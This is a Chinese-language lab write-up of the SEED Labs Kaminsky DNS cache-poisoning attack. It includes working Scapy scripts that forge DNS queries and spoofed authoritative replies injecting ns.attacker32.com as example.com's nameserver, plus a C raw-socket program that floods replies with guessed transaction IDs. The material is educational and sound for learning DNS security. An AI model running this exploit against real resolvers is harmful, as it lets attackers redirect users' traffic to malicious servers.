---
title: The-Kaminsky-Attack-Lab
categories:
  - SeedLabs/NetworkSecurity
tags:
  - Kaminsky Attack
  - NetworkSecurity
abbrlink: cc08d9b4
date: 2024-03-24 01:13:23
---

## Lab Overview

 Kaminsky DNS 攻击，是一种远程的 DNS 缓存污染攻击。

## Lab Environment Setup (Task 1)

本次实验需要用到四台机器，一台用于 Victim，一台用于 DNS Server，两台用于 Attacker。

![image-20240315182752600](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240315182752600.png)

环境配置和 Local DNS Attack 是一模一样的，区别只是在于这次实验不能嗅探包了。

## The Attack Tasks

正确的 DNS 查询过程是如下所示的：

![image-20240317150931365](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240317150931365.png)

## How Kaminsky attack works

当 Apollo 等待来自 example.com 名称服务器的 DNS 答复时，攻击者可以假装答复来自 example.com 的名称服务器，向 Apollo 发送伪造的答复。如果伪造的回复先到达，Apollo 就会 接受它。攻击就会成功。

当攻击者和域名服务器缓存污染攻击不在同一个局域网上时，缓存中毒攻击就变得更加困难。困难的主要原因是 DNS 响应包中的事务 ID 必须与查询包中的事务 ID 相匹配。由 于查询中的事务 ID 通常是随机生成的，而不会看到查询数据包，因此攻击者很难知道正确的 ID。

然而，除非我们轻易的猜测出正确的 ID，否则，一旦正确的响应到达就会被 Apollo 缓存，攻击者就必须等待缓存超时，等待时间可以是几个小时，也可以是几天。

![image-20240317151103556](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240317151103556.png)

卡明斯基想出了一个优雅的技巧来对抗上述的缓存，从而可以使得攻击者能够持续的攻击域名上的 DNS 服务器。

1.   攻击者在 example.com 中向 Apollo 查询一个不存在的域名，比如 fake.example.com。
2.   由于在 Apollo 的 DNS 缓存中不存在，Apollo 将向 example.com 域的 name-server 发送一 个 DNS 查询。
3.   在 Apollo 等待回复的同时，攻击者向 Apollo 发送大量伪造的 DNS 响应流，每个都尝试不同的事务 ID， 希望其中一个是正确的。在响应中，攻击者不仅为 fake.example. com 提供了一个 IP 解析，还包含一个 “Authoritative Nameservers” 记录，指示 ns.attacker32.com 作为 example.com 域的 nameserver。
4.   即使这一次没有猜测出来，下一次攻击将查询不同的名称，如 fake2.example.com，Apollo 必须发送另一个查询，这给了攻击者另一个机会。
5.   如果攻击成功，Apollo 的缓存中，example.com 的名称服务器将会被 ns.attacker32.com 取代。

## Task 2: Construct DNS request

在这个任务中，我们要触发 DNS 服务器发送 DNS 查询，这样就有欺骗 DNS 应答。

```python
from scapy.all import *


def dns_query(domin):
    dns_request = IP(dst='10.9.0.53')/UDP(dport=53) / \
        DNS(id=0xAAAA, qr=0, qdcount=1, qd=DNSQR(qname=domin))
    send(dns_request)


dns_query("fake"+str(1)+".example.com")
```

如上代码，发送 DNS 请求，查询 fake1.example.com。可以看到，数据包被发送给了 DNS 服务器，服务器也向根 DNS 发起了查询。然后有一些乱七八糟的东西，大概就是递归查询的过程。

![image-20240317160031663](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240317160031663.png)

我们可以看到，最终查询到了最终的 DNS 服务器，得到了结果就是没有这个域名。

![image-20240317160006589](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240317160006589.png)

## Task 3: Spoof DNS Replies

代码如下，其中源 IP 应该是 example.com 的名称服务器，经过查询可以知道是如下的两个 IP。

```python
from scapy.all import *

name = "fake1.example.com"
domain = "example.com"
ns = "ns.attacker32.com"
Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)
NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1, qdcount=1, ancount=1,
          nscount=1, arcount=0, qd=Qdsec, an=Anssec, ns=NSsec)
ip = IP(dst='10.9.0.53', src='199.43.135.53')  # 199.43.133.53
udp = UDP(dport=33333, sport=53, chksum=0)
reply = ip/udp/dns
send(reply)
```

使用 Wireshark 捕获，可以发现，确实发送了一个响应包。不过这个响应包 id 肯定不对，我们只是用来进行测试，发包是没有问题的。

![image-20240317164909903](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240317164909903.png)

## Task 4: Launch the Kaminsky Attack

现在我们可以把所有的东西放在一起进行卡明斯基袭击了。在攻击中，我们需要发送许多伪造的 DNS 回复，希望其中一个回复命中正确的交易号码，并比合法的回复更快到达。如果使用 Scapy，那么速度确实太慢了；如果使用 C 语言，那么构造伪造的 DNS 响应包太麻烦了。

我们使用混合方式，首先使用 Scapy 来生成一个 DNS 数据包模板，它存储在一个文件中。然后我们将这个模板加载到一个 C 程序中，对一些字段做一些小的修改，然后发送数据包 。

1.   生成 DNS 请求数据包

```python
from scapy.all import *

# chksum=0，表示不进行校验，后续我们修改数据就没关系
dns_request = IP(dst='10.9.0.53')/UDP(dport=53, chksum=0) / \
    DNS(id=0xAAAA, qr=0, qdcount=1, qd=DNSQR(qname='12345.example.com'))

with open('ip_req.bin', 'wb') as f:
    f.write(bytes(dns_request))
    dns_request.show()
```

2.   生成 DNS 响应数据包（其中源 IP 地址是正确的名称服务器，即下面截图中的  a.iana-servers.net ）

```python
from scapy.all import *

Qdsec = DNSQR(qname="12345.example.com")
Anssec = DNSRR(rrname="12345.example.com", type='A', rdata='1.2.3.4', ttl=259200)
NSsec = DNSRR(rrname="example.com", type='NS', rdata="ns.attacker32.com", ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=0, qr=1, qdcount=1, ancount=1,
          nscount=1, arcount=0, qd=Qdsec, an=Anssec, ns=NSsec)
ip = IP(dst='10.9.0.53', src='199.43.135.53', chksum=0)  # 199.43.133.53
udp = UDP(dport=33333, sport=53, chksum=0)
dns_reply = ip/udp/dns

with open('ip_resp.bin', 'wb') as f:
    f.write(bytes(dns_reply))
    dns_reply.show()
```

3.   使用 C 语言，短时间构造大量的响应包。请求包我们需要修改域名前五个字符，响应包我们需要修改域名前五个字符和 ID。使用二进制查看器就可以知道这些字段在二进制文件中的偏移，如 vscode 插件 Hex editor。

```c
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define MAX_FILE_SIZE 1000000

/* IP Header */
struct ipheader {
  unsigned char iph_ihl : 4,       // IP header length
      iph_ver : 4;                 // IP version
  unsigned char iph_tos;           // Type of service
  unsigned short int iph_len;      // IP Packet length (data + header)
  unsigned short int iph_ident;    // Identification
  unsigned short int iph_flag : 3, // Fragmentation flags
      iph_offset : 13;             // Flags offset
  unsigned char iph_ttl;           // Time to Live
  unsigned char iph_protocol;      // Protocol type
  unsigned short int iph_chksum;   // IP datagram checksum
  struct in_addr iph_sourceip;     // Source IP address
  struct in_addr iph_destip;       // Destination IP address
};

void send_raw_packet(char *buffer, int pkt_size);
void send_dns_request(unsigned char *pkt, int pktsize, char *name);
void send_dns_response(unsigned char *pkt, int pktsize, char *name,
                       unsigned short id);

int main() {
  srand(time(NULL));

  // Load the DNS request packet from file
  FILE *f_req = fopen("ip_req.bin", "rb");
  if (!f_req) {
    perror("Can't open 'ip_req.bin'");
    exit(1);
  }
  unsigned char ip_req[MAX_FILE_SIZE];
  int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);

  // Load the first DNS response packet from file
  FILE *f_resp = fopen("ip_resp.bin", "rb");
  if (!f_resp) {
    perror("Can't open 'ip_resp.bin'");
    exit(1);
  }
  unsigned char ip_resp[MAX_FILE_SIZE];
  int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);

  char a[26] = "abcdefghijklmnopqrstuvwxyz";
  unsigned short transid = (rand() % 16) << 12;
  while (1) {
    // Generate a random name with length 5
    char name[6];
    name[5] = '\0';
    for (int k = 0; k < 5; k++)
      name[k] = a[rand() % 26];

    //############################################
    /* Step 1. Send a DNS request to the targeted local DNS server.
               This will trigger the DNS server to send out DNS queries */

    // ... Students should add code here.
    send_dns_request(ip_req, n_req, name);

    /* Step 2. Send many spoofed responses to the targeted local DNS server,
               each one with a different transaction ID. */

    // ... Students should add code here.
    for (int i = 0; i < 0x1000; i++) {
      transid++;
      printf("name is %s, id is %d\n", name, transid);
      send_dns_response(ip_resp, n_resp, name, transid);
    }
    //############################################
  }
}

/* Use for sending DNS request.
 * Add arguments to the function definition if needed.
 * */
void send_dns_request(unsigned char *pkt, int pktsize, char *name) {
  // Students need to implement this function
  memcpy(pkt + 41, name, 5);
  send_raw_packet((char *)pkt, pktsize);
}

/* Use for sending forged DNS response.
 * Add arguments to the function definition if needed.
 * */
void send_dns_response(unsigned char *pkt, int pktsize, char *name,
                       unsigned short id) {
  // Students need to implement this function
  memcpy(pkt + 41, name, 5);
  memcpy(pkt + 64, name, 5);
  unsigned short transid = htons(id);
  memcpy(pkt + 28, (void *)&transid, 2);
  send_raw_packet((char *)pkt, pktsize);
}

/* Send the raw packet out
 *    buffer: to contain the entire IP packet, with everything filled out.
 *    pkt_size: the size of the buffer.
 * */
void send_raw_packet(char *buffer, int pkt_size) {
  struct sockaddr_in dest_info;
  int enable = 1;

  // Step 1: Create a raw network socket.
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  // Step 2: Set socket option.
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

  // Step 3: Provide needed information about destination.
  struct ipheader *ip = (struct ipheader *)buffer;
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  // Step 4: Send the packet out.
  sendto(sock, buffer, pkt_size, 0, (struct sockaddr *)&dest_info,
         sizeof(dest_info));
  close(sock);
}
```

执行过程中查看结果如下，执行一段时间后，攻击成功。

![image-20240318003245124](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240318003245124.png)

### Task 5: Result Verification

结果验证，后续我们查询 www.example.com，将会向 ns.attacker32.com 询问。在 User 处验证如下，攻击成功，达到了目的。

![image-20240318004235602](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240318004235602.png)